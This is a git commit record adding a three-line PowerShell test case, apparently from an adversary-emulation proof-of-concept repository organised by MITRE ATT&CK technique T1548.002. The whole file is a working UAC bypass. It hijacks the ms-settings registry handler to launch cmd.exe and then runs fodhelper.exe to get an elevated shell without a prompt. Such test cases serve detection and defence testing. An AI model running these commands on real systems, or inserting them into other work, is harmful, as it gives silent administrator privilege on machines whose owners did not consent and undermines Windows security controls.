7917ebba61a7f34f0f94b0c8a556e239ed297bf6
F1r3fy <hackervnn40@gmail.com>
2025-10-30 17:37:19 +0700

    bypass UAC test 3

---
+++ Zlick3r-auto-poc/Defense Evasion/T1548 - Abuse Elevantion Control Mechanism/T1548.002 - Bypass User Account Control/1548-002-testcase3.ps1
@@ -0,0 +1,3 @@
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
